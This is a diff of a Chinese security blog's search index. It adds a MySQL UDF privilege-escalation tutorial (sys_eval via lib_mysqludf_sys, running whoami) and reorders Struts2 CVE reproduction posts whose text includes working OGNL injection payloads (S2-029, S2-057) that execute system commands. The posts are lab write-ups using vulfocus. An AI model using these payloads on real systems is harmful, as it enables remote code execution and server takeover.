@@ -98,6 +98,43 @@
       </tags>
   </entry>
   <entry>
+    <title>MySQL UDF提权执行系统命令</title>
+    <url>/posts/d83e4025.html</url>
+    <content><![CDATA[<h2 id="什么是UDF库"><a href="#什么是UDF库" class="headerlink" title="什么是UDF库"></a>什么是UDF库</h2><p><code>UDF</code>即用户自定义函数。是通过添加新函数，对<code>MYSQL</code>的功能进行补充，就像使用本地<code>MYSQL</code>函数<code>user()</code>和<code>concat()</code>等。</p>
+<h2 id="UDF提权步骤"><a href="#UDF提权步骤" class="headerlink" title="UDF提权步骤"></a>UDF提权步骤</h2><h3 id="查看secure-file-priv的值"><a href="#查看secure-file-priv的值" class="headerlink" title="查看secure_file_priv的值"></a>查看<strong>secure_file_priv的值</strong></h3><p><code>secure_file_priv</code> 是用来限制<code> load dumpfile</code>、<code>into  outfile</code>、<code>load_file()</code> 函数在哪个目录下拥有上传或者读取文件的权限：</p>
+<p>使用命令<code>show global variables like &#39;secure%&#39;</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;secure%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当 <code>secure_file_priv</code> 的值为 <code>NULL </code>，表示限制 <code>mysqld </code>不允许导入|导出，此时无法提权</li>
+<li>当 <code>secure_file_priv </code>的值为 <code>/tmp/</code> ，表示限制 <code>mysqld </code>的导入|导出只能发生在<code>/tmp/</code> 目录下，此时也无法提权</li>
+<li>当 <code>secure_file_priv</code>的值没有具体值时，表示不对 <code>mysqld</code>的导入|导出做限制，此时可提权</li>
+</ul>
+<p><code>secure_file_priv</code>的值在<code>MySQL</code>数据库的安装目录的 <code>my.ini</code> 文件中配置：<br><img src="https://qiniu.hzktester.top/tp2020111501.png" alt="tp2020111501.png"></p>
+<h3 id="查看系统架构以及plugin目录"><a href="#查看系统架构以及plugin目录" class="headerlink" title="查看系统架构以及plugin目录"></a><strong>查看系统架构以及plugin目录</strong></h3><p>首先，我们分别通过<code>@@ version_compile_os</code>和<code>@@ version_compile_machine</code>，来获取当前数据库及操作系统的架构情况。结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| @@version_compile_os | @@version_compile_machine |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| Win32                | AMD64                     |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;%compile%&#x27;</span>;</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| Variable_name           | Value |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| version_compile_machine | AMD64 |</span><br><span class="line">| version_compile_os      | Win32 |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>从<code>MySQL 5.0.67</code>开始，<code>UDF</code>库必须包含在<code>plugin</code>文件夹中，我们可以使用<code>@@ plugin_dir</code>全局变量找到该目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| @@plugin_dir                              |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;plugin%&#x27;</span>;</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| Variable_name | Value                                     |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| plugin_dir    | C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>当 <code>MySQL&lt; 5.1</code> 版本时，将 .dll 文件导入到 <code>c:\windows</code> 或者 <code>c:\windows\system32</code> 目录下。</li>
+<li>当 <code>MySQL&gt; 5.1 </code>版本时，将 .dll 文件导入到<code> MySQL Server 5.xx\lib\plugin</code> 目录下 (<code>lib\plugin</code>目录默认不存在，需自行创建)。<h3 id="将dll文件写入plugin目录-并且创建函数"><a href="#将dll文件写入plugin目录-并且创建函数" class="headerlink" title="将dll文件写入plugin目录,并且创建函数"></a><strong>将dll文件写入plugin目录,并且创建函数</strong></h3>我们将使用<code>lib_mysqludf_sys_32.dll</code>的<code>DLL</code>库，你可以在<code>Metasploit</code>框架中找到它。你可以使用基于系统架构的<code>UDF</code>库，它们在<code>Metasploit</code>的安装目录<code>/usr/share/metasploit-framework/data/exploits/mysql/</code>。<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">点击这里</a>查看下载：</li>
+</ul>
+<p>我这里做测试，就直接上传到目录中了：<br><img src="https://qiniu.hzktester.top/tp2020111502.png" alt="tp2020111502.png"><br>创建函数<code>sys_eval</code>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; create <span class="keyword">function</span> sys_eval returns string soname <span class="string">&#x27;lib_mysqludf_sys_32.dll&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="使用系统命令"><a href="#使用系统命令" class="headerlink" title="使用系统命令"></a><strong>使用系统命令</strong></h3><p>在将 <code>udf.dll</code> 文件写入<code>plugin</code>目录后，我们就可以使用 <code>sys_eval</code>函数了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func <span class="built_in">where</span> name = <span class="string">&#x27;sys_eval&#x27;</span>;	<span class="comment">#查看创建的sys_eval函数</span></span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| name     | ret | dl                      | <span class="built_in">type</span>     |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| sys_eval |   0 | lib_mysqludf_sys_32.dll | <span class="keyword">function</span> |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);	<span class="comment">#使用系统命令</span></span><br><span class="line">+---------------------------+</span><br><span class="line">| sys_eval(<span class="string">&#x27;whoami&#x27;</span>)        |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 172_27_0_11\administrator |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.06 sec)</span><br></pre></td></tr></table></figure>
+<p>如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用<code>MSF</code>里面的** <strong><code>exploit/multi/mysql/mysql_udf_payload</code></strong> **模块自动注入。</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a><br><a href="https://blog.csdn.net/wsnbbz/article/details/104802100">https://blog.csdn.net/wsnbbz/article/details/104802100</a><br><a href="https://www.freebuf.com/articles/system/163144.html">https://www.freebuf.com/articles/system/163144.html</a></p>
+]]></content>
+      <categories>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>MySQL UDF提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>正则表达式，字符串的匹配与查找函数，数组切割</title>
     <url>/posts/c0ec548.html</url>
     <content><![CDATA[<h2 id="PHP中的正则表达式"><a href="#PHP中的正则表达式" class="headerlink" title="PHP中的正则表达式"></a>PHP中的正则表达式</h2><blockquote>
@@ -3853,6 +3890,26 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <url>/posts/2b1c937.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
+<a id="more"></a>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>使用vulfocus启动环境<br><img src="https://qiniu.hzktester.top/tp2020081405.png" alt="image"></p>
+</li>
+<li><p>直接使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081406.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-029 CVE-2016-0785复现过程</title>
     <url>/posts/33bebcf9.html</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
@@ -3869,26 +3926,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://qiniu.hzktester.top/tp2020081404.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <url>/posts/2b1c937.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
-<a id="more"></a>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>使用vulfocus启动环境<br><img src="https://qiniu.hzktester.top/tp2020081405.png" alt="image"></p>
-</li>
-<li><p>直接使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081406.png" alt="image"></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -3924,6 +3961,26 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-052 CVE-2017-9805复现过程</title>
+    <url>/posts/1359d177.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081410.png" alt="image"></p>
+</li>
+<li><p>使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081411.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-053 CVE-2017-12611复现过程</title>
     <url>/posts/b9ffad5e.html</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
@@ -3947,15 +4004,17 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <url>/posts/1359d177.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/posts/e935ed10.html</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
 <a id="more"></a>
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081410.png" alt="image"></p>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
 </li>
-<li><p>使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081411.png" alt="image"></p>
+<li><p>poc利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
 </li>
 </ol>
 ]]></content>
@@ -3982,28 +4041,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://qiniu.hzktester.top/tp2020081417.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/posts/e935ed10.html</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
